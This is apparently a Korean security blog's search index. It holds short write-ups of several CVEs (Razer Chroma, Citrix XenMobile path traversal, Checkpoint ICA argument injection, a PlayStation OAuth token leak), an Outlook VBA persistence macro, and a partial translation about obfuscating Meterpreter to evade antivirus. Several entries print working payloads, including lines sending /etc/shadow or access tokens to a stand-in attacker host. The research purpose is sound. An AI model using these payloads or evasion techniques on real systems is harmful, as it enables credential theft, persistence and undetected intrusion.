<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
    <link href="/2020/11/28/fabu1ous/2020-11-28/"/>
    <url>/2020/11/28/fabu1ous/2020-11-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma는 Razer사의 게이밍용 컴퓨터 주변기기들의 RGB 효과를 제어하는 플러그인으로 Razer synapse 설치 시 자동으로 설치됩니다. SDK가 존재해서 third party가 Razer Chroma와 연동되는 기능을 만들 수 있습니다. </p><p>예 ) Razer 제품과 RGB효과를 동기화하는 케이스, 음악에 맞춰 Razer 제품의 RGB를 변화시키는 음악 스트리밍 서비스 </p><p>Razer Chroma SDK Rest server는 Razer Chroma를 사용하는 컴퓨터에서 동작하고 있으며 모든 네트워크 인터페이스와 bind 해 54236번 포트로 listen 합니다. <code>http://localhost:54235/razer/chromasdk</code> 혹은<code> https://chromasdk.io:54236/razer/chromasdk</code> URI로 App info를 담은 POST request를 받으면 그 App info에 따라 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 실행파일을 생성하고 실행합니다.</p><p>몇 가지 이슈로 인해 race-condition을 이용한 arbitrary code execution이 가능합니다.</p><ol><li><p>해커는 Razer Chroma SDK Rest server가 동작하는 컴퓨터(이하 victim)의 IP주소만 알면 원격으로 POST request를 보내 임의의 파일명을 갖는 실행파일을 victim에 생성할 수 있습니다.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST request를 받아 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 생성한 실행파일은 Admin권한이 있는 유저만 수정할 수 있습니다. 하지만 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더는 Admin 권한이 없어도 수정이 가능합니다.</li></ol><ol start="3"><li>POST request로 생성할 실행파일(test.exe)과 동일한 이름의 파일이 이미 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더 안에 존재하면 Razer Chroma SDK Rest server는 기존 파일의 내용을 덮어씁니다. 하지만 그 실행파일의 권한은 그 파일이 실행되기 전까진 수정하지 않으므로, 해커는 race-condition으로 test.exe의 내용을 수정해  arbitrary code execution을 할 수 있습니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>razer</tag>
      
      <tag>chroma</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
    <link href="/2020/11/27/l0ch/2020-11-27/"/>
    <url>/2020/11/27/l0ch/2020-11-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>조직 구성원들의 모바일 디바이스 및 애플리케이션을 관리하는 Endpoint Management 솔루션인 XenMobile에서 path traversal로 권한이 없는 사용자가 패스워드를 포함한 임의 파일을 읽을 수 있고, 암호화된 패스워드를 복호화 할 수 있는 취약점이 발견되었습니다.</p><p><code>help-sb-download.jsp</code> 에 존재하는 취약한 코드는 아래와 같습니다.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>매개변수로 받는 <code>sbFileName</code>은 <code>sbFilePath</code>의 <code>/op/sas/support/</code> 뒤에 연결되고 File 클래스 생성자의 인수가 됩니다. <code>sbFileName</code>에 <code>../../../etc/passwd</code>를 전달하면 <code>/etc/passwd</code>의 내용을 출력할 수 있습니다.</p><p>이를 이용해 암호화된 패스워드의 복호화도 가능합니다. 패스워드 암호화는 <code>/opt/sas/sw/lib/libsecure.so</code> 와 <code>DataSecurity.jar</code> 라이브러리에서 이루어지며  <code>/opt/sas/rt/keys/security.properties</code>에는 암호화 키가 존재합니다. 해커가 path traversal 취약점을 악용해 라이브러리와 key를 다운로드하고 로컬 환경에서 암호화 라이브러리를 import 해 패스워드를 복호화할 수 있습니다.</p><p>이 취약점은 <code>help-sb-download.jsp</code> 파일을 제거하는 것으로 패치가 이루어졌습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>arbitrary file download</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
    <link href="/2020/11/26/idioth/2020-11-26/"/>
    <url>/2020/11/26/idioth/2020-11-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</p><p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p><p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p><p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>dos</tag>
      
      <tag>argument injection</tag>
      
      <tag>checkpoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Outlook Mail based Persistence access</title>
    <link href="/2020/11/25/fabu1ous/2020-11-25/"/>
    <url>/2020/11/25/fabu1ous/2020-11-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook은 Microsoft Office의 이메일 클라이언트로 일정 관리, 연락처 관리, 일지 등의 다양한 기능을 제공합니다. 그중 다른 Office 제품들과 마찬가지로 Outlook은 VBA(Visaul Basic for Application) 기반 매크로를 만들어 사용하는 기능이 있고, 해커는 이를 악용해 persistence access를 얻을 수 있습니다.</p><p>Persistence access란 해커가 victim에 initial access를 획득한 이후에도 지속적으로 access 할 수 있는 상태입니다. 특정 제목의 이메일이 도착하면 트리거 되는 악성 매크로를 victim에 심어놓으면 해커는 단순히 이메일을 보내는 것만으로 원격 제어할 수 있습니다.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>위 POC 코드는 calc.exe를 실행하는 VBA 매크로입니다. 우선 Outlook이 실행됐을 때의 수신 메일함 상태를 저장합니다. 이후에 새로운 이메일이 추가되면 그 이메일의 제목을 확인하고, 만약 그 제목이 “MDSec”이라면 calc.exe를 실행한 후 해당 이메일을 삭제합니다.</p><p>이메일의 제목뿐만 아니라 발신 주소 혹은 내용 등으로 매크로의 트리거 조건을 다양하게 설정할 수 있고, calc.exe 대신 리버스 쉘을 실행하면 해커가 원격 제어를 할 수 있게 됩니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>outlook</tag>
      
      <tag>email</tag>
      
      <tag>persistence access</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Access token stealing in playstation</title>
    <link href="/2020/11/24/l0ch/2020-11-24/"/>
    <url>/2020/11/24/l0ch/2020-11-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a href="https://my.playstation.com/auth/response.html%EC%97%90%EC%84%9C">https://my.playstation.com/auth/response.html에서</a> 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p><ol><li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li><li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li><li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li></ol><p>이를 이용한 최종 페이로드는 다음과 같습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>L0ch</tag>
      
      <tag>access token stealing</tag>
      
      <tag>playstation</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
    <link href="/2020/11/23/idioth/2020-11-23/"/>
    <url>/2020/11/23/idioth/2020-11-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experience의 GeForce 그래픽카드가 설치된 장비로 원격 게임을 지원하는 GAMESTREAM 기능에서 Local Privilege Escalation 취약점이 발견되었습니다.</p><p>nvcontainer.exe 프로세스는 user impersonation 없이 <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> 디렉터리에 <code>CaptureCore.log</code> 파일을 쓰거나 생성합니다. 이때 상위 폴더 상속으로 인해 모든 사용자는 해당 파일과 파일이 있는 폴더에 모든 권한을 갖습니다. 하지만 <code>CaptureCore.log</code> 파일을 삭제한 후 GAMESTREAM을 재시작하면 <code>nvspapi64.dll</code>에서 소프트 링크와 하드 링크에 대한 검사를 진행하여 심볼릭 링크 파일을 삭제합니다. 이 작업은 <code>nvspapi64.dll</code>에서 수행되는데 검사를 진행한 후 <code>CaptureCore.log</code>에 대한 핸들을 닫고 최종 경로를 가져와 작업을 수행하기 위해 다시 핸들을 엽니다.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png"></p><p>이를 활용하여 특정 파일에 대한 access event를 catch 하는 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>을 CaptureCore.log에 설정한 후 검사를 진행하면 OpLock이 트리거 되어 C:\Windows\System32 폴더에 arbitrary file creation이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
      <tag>idioth</tag>
      
      <tag>lpe</tag>
      
      <tag>geforce experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.1</title>
    <link href="/2020/11/22/idioth/av_evasion_part1/"/>
    <url>/2020/11/22/idioth/av_evasion_part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요. 하지 말라는 것은 더 하고 싶은 idioth입니다.</p><p>원래 사람은 하지 말라면 더 하고 싶은 법. 그래서 평소 탐지 우회하는 것에 대해 관심이 많은데 관련 글이 있길래 들고 왔습니다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg"></p><p>평소에는 그냥 혼자 공부하고 혼자 보는거라 직독직해 해놓고 스스로 머릿 속에서 정리하였는데 글로 적으려니 고생을 좀 했습니다. 영어 실력이 좋은 것도 아니고 번역을 많이 해본 것도 아니라 의역과 오역이 난무하는 글이 될 것 같습니다…</p><p>보시다가 이 부분은 왜 이렇게 번역이 됐지? 혹은 너무 이상한데? 하시는 것 있으시면 댓글로 달아드리면 눈물 흘리며 수정하도록 하겠습니다!</p><blockquote><p>원문 글 : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> 이 게시물은 모든 AV/EDR을 우회하기 위해 자동으로 Meterpreter을 refactoring 하는 것에 대해 설명한다. 모든 기술에 대한 아이디어와 문자열 난독화 패스의 구현이 상세히 설명되어있다. API import를 숨기는 것과 syscall 재작성에 대한 자세한 내용은 게시글이 너무 길어지므로 다음 글에서 소개할 것이다. 소스코드는 <a href="https://github.com/scrt/avcleaner">github</a>에서 확인할 수 있다.</p><p>기업이 정보 시스템을 보호하기 위해서 안티 바이러스와 EDR 같은 보안 소프트웨어는 필수적이다. 과거에는 모든 멀웨어 탐지 기술을 우회하기가 쉬웠지만 탐지 기술이 발전함에 따라 우회에 더 많은 노력이 필요하다.</p><p>취약점을 증명하기 위한 Proof-of-Concept가 안티 바이러스에 의해 차단된 경우 위험성에 대해 이야기하는 것은 매우 어렵다. 이론적으로 탐지를 우회하는 것이 가능하다고 얘기할 수 있지만 증명하기가 어렵다.</p><p> 또한 시스템의 existing foothold에서만 발견할 수 있는 취약점들이 있다. pentester가 initial level에 접근할 수 없는 경우 시스템의 실제 보안 상태를 도출할 수 없다.</p><p>따라서 안티바이러스 소프트웨어 우회는 필요하다. SCRT(필자의 팀)에서는 공개적으로 사용 가능한 오픈 소스 툴을 사용해 툴을 사용하는데 숙련된 누구나 따라 할 수 있으며 private 하고 비싼 툴에 의존하지 않아도 된다는 점을 강조한다.</p><h1 id="문제점"><a href="#문제점" class="headerlink" title="문제점"></a>문제점</h1><p>사람들은 안티 바이러스의 탐지가 정적인지 동적인지 분류하는 것을 좋아한다. 보통 실행 전에 트리거 되면 정적 탐지로 간주된다. 하지만 프로세스 생성, in-memory file downloads 같은 이벤트를 통해 멀웨어 실행 시 signature와 같은 정적 탐지 메커니즘이 호출될 수 있다는 것은 아는 것이 좋다. 모든 보안 소프트웨어에 Meterpreter를 사용하려면 다음과 같이 수정해야 한다.</p><ul><li>파일 시스템 스캔 혹은 메모리 스캔 중에 모든 static signature 우회</li><li>userland API hooking 우회와 관련된 “행동 탐지” 우회</li></ul><p>Meterpreter는 여러 모듈로 구성되며 전체 코드 베이스의 양이 많고 계속 업데이트되므로 private fork를 수행하기 힘들다. 따라서 자동으로 코드 베이스를 수정할 방법이 필요하다.</p><h1 id="해결-방안"><a href="#해결-방안" class="headerlink" title="해결 방안"></a>해결 방안</h1><p>멀웨어 탐지는 대부분 문자열, API hook, 혹은 둘의 조합을 기반으로 한다.</p><p>Cylance 같은 머신러닝 classifier를 구현하는 제품에서도 문자열, API import, 후킹 할 수 있는 API 호출이 없는 멀웨어는 탐지를 우회할 수 있다.</p><p>Meterpreter는 수천 개의 문자열을 가지고 있고 API imports는 어떠한 방법으로도 숨겨지지 않으며 <code>WriteProcessMemory</code> 같은 민감한 API는 userland API hook으로 쉽게 intercept 할 수 있다. 따라서 자동화된 방식을 사용하여 2개의 솔루션을 만들어야 한다.</p><ul><li>Source-to-source code refactoring</li><li>LLVM 컴파일 시 코드 베이스 난독화</li></ul><p>후자가 선호되는 방식이며 많은 유명한 연구들에서 같은 결론에 도달했다. transformation pass를 한 번 작성해서 소프트웨어의 프로그래밍 언어나 target architecture에 상관없이 재사용할 수 있기 때문이다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png"></p><p>이미지 출처: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>그러나 이 방법은 Visual Studio가 아닌 다른 컴파일러로 Meterpreter를 컴파일할 수 있어야 한다. 이를 수정하기 위해 2018년 12월에 몇 가지 작업을 퍼블리시했지만 1년이 더 지난 지금도 공식 코드 베이스에 적용되지 않았다.</p><p>그동안 우리는 첫 번째 접근법을 구현하기로 결정했다. 최첨단 소스 코드 refactoring를 살펴본 결과 <em>libTooling</em>(Clang/LLVM toolchain의 일부)이 C/C++ 소스의 구문 분석과 수정에 가장 적합했다.</p><p>Note: 코드 베이스는 Visual Studio 의존성이 강하기 때문에 Clang은 Meterpreter의 많은 부분의 구문 분석에 실패할 것이다. 그러나 타겟 안티바이러스를 50% 확률로 우회할 수 있었다. 또한 소스 코드를 변환하는 것이 컴파일 시에 변환하는 것보다 장점이 있을 것이다. 후자는 에러 없이 전체 프로젝트를 컴파일해야 하지만 전자는 수천 개의 컴파일 에러에 탄력적이며 불완전한 추상 구문 트리로 끝이 난다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png"></p><p>LLVM passes vs libTooling</p><h2 id="문자열-난독화"><a href="#문자열-난독화" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>C/C++에서 문자열은 다양한 context 안에 존재한다.</p><p><em>libTooling</em>을 사용하는 것은 복잡하므로 Meterpreter의 코드 베이스에서 의심스러운 문자열이 나타나는 부분을 보면 다음과 같다.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32는 다음 코드에서 <code>ntdll</code> 문자열을 의심스러운 문자열로 탐지한다.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>그러나 다음과 같이 코드를 재작성하면 성공적으로 탐지를 우회한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span>&#125;;ntdll = LoadLibrary(ntdll_str)</code></pre><p>첫 번째 코드는 <code>.rdata</code> 섹션에 <code>&quot;ntdll&quot;</code> 문자열이 저장돼서 안티바이러스에게 쉽게 발견된다. 두 번째 코드는 문자열이 실행 시 스택에 저장돼서 보통 정적으로 구분할 수 없다. <em>IDA Pro</em>와 같은 툴에서는 문자열을 탐지할 수 있지만 바이너리를 더 복잡하게 분석해야 한다.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreter의 코드 베이스에서 다음과 같은 구성은 <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>와 같은 파일에서 찾을 수 있다.</p><pre><code class="hljs cpp">Command customCommands[] =&#123;    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...&#125;</code></pre><p>이 문자열들은 <code>ext_server_espia_x64.dll</code>의 <code>.rdata</code> 영역에 평문으로 저장되고 <em>ESET Nod32</em>에서 탐지된다.</p><p>이 문자열들은 list initialzier에 위치한 매크로의 매개변수이다. 목표는 자동으로 위의 코드를 다음과 같이 재작성하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span 